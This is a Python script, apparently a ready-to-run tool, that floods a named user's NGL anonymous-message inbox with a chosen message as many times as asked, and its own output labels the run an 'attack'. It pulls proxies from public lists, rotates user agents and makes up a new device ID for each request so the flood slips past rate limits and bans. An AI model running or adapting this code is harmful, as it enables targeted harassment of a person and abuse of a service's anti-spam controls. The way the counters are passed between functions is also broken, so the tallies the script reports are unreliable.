import concurrent.futures
import requests
import os
from pystyle import Colors, Colorate
import time
import random
import uuid

def fetch_and_update_proxies(api_index):
    proxy_api_urls = [
        "https://proxyspace.pro/http.txt",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://www.proxy-list.download/api/v1/get?type=http&anon=elite",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
        "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
        "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://api.openproxylist.xyz/http.txt",
        "https://www.proxy-list.download/api/v1/get?type=http&anon=anonymous"
    ]

    if api_index >= len(proxy_api_urls):
        print(Colorate.Vertical(Colors.red_to_white, "[!] All proxy APIs used. Restarting from the beginning."))
        api_index = 0

    proxies = set()

    for api_url in proxy_api_urls[api_index:]:
        try:
            response = requests.get(api_url, timeout=10)
            if response.status_code == 200:
                proxies.update(response.text.strip().split('\n'))
                break
        except requests.exceptions.RequestException as e:
            print(f"[!] Error fetching proxies from {api_url}: {e}")

    with open('proxies.txt', 'w') as file:
        file.write('\n'.join(proxies))

    print(Colorate.Vertical(Colors.green_to_blue, "[+] Proxies updated successfully."))

    return api_index + 1

def fetch_user_agents():
    user_agents_url = "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt"
    try:
        response = requests.get(user_agents_url, timeout=10)
        if response.status_code == 200:
            return response.text.strip().split('\n')
    except requests.exceptions.RequestException as e:
        print(f"[!] Error fetching user-agents: {e}")
    return []

def generate_random_device_id():
    return str(uuid.uuid4())

def send_request(proxy, user_agent, device_id, nglusername, message, value, total_count, success_count, fail_count):
    R = '\033[31m'
    G = '\033[32m'
    W = '\033[0m'
    
    headers = {
        'Host': 'ngl.link',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua-mobile': '?0',
        'user-agent': user_agent,
        'sec-ch-ua-platform': '"Windows"',
        'origin': 'https://ngl.link',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': f'https://ngl.link/{nglusername}',
        'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    data = {
        'username': f'{nglusername}',
        'question': f'{message}',
        'deviceId': device_id,
        'gameSlug': '',
        'referrer': '',
    }

    try:
        with requests.Session() as session:
            response = session.post('https://ngl.link/api/submit', headers=headers, data=data, proxies=proxy, timeout=10)
            if response.status_code == 200:
                success_count += 1
            else:
                fail_count += 1
        time.sleep(10)  # Wait for 10 seconds between requests

    except requests.exceptions.RequestException as e:
        fail_count += 1

    return success_count, fail_count

def ngl_parallel():
    api_index = 0
    while True:
        api_index = fetch_and_update_proxies(api_index)

        R = '\033[31m'
        G = '\033[32m'
        W = '\033[0m'

        os.system('cls' if os.name == 'nt' else 'clear')

        print(Colorate.Vertical(Colors.blue_to_purple, """
            
██████╗  ██╗
██╔══██╗███║
██████╔╝╚██║
██╔══██╗ ██║
██║  ██║ ██║
╚═╝  ╚═╝ ╚═╝


Developed by: ReuvenDev     
         """))

        nglusername = input(Colorate.Vertical(Colors.blue_to_purple, "Username: "))
        message = input(Colorate.Vertical(Colors.blue_to_purple, "Message: "))
        Count = int(input(Colorate.Vertical(Colors.blue_to_purple, "Count:")))

        with open('proxies.txt', 'r') as file:
            proxies_list = [line.strip() for line in file]

        user_agents = fetch_user_agents()

        print(Colorate.Vertical(Colors.green_to_blue, "**********************************************************"))
        print(Colorate.Vertical(Colors.blue_to_purple, """
            
╔════════════╗
SENDING ATTACK
╚════════════╝
         """))
        print(Colorate.Vertical(Colors.blue_to_purple, f"Username: {nglusername} | Message: {message} | Count: {Count}"))

        value = 0
        success_count = 0
        fail_count = 0

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for i in range(Count):
                proxy = {'http': 'http://' + proxies_list[random.randint(0, len(proxies_list) - 1)]}
                user_agent = random.choice(user_agents)
                device_id = generate_random_device_id()
                
                future = executor.submit(
                    send_request, proxy, user_agent, device_id, nglusername, message, i + 1, Count, success_count, fail_count
                )
                futures.append(future)

            for future in concurrent.futures.as_completed(futures):
                success_count, fail_count = future.result()

        print(Colorate.Vertical(Colors.green_to_blue, "**********************************************************"))
        print(Colorate.Vertical(Colors.blue_to_purple, "[+] Attack completed successfully."))
        print(Colorate.Vertical(Colors.blue_to_purple, f"Username: {nglusername} | Message: {message} | Count: {Count}"))
        
        restart = input("Do you want to restart? (y/n): ")
        if restart.lower() != 'y':
            break

if __name__ == "__main__":
    ngl_parallel()
    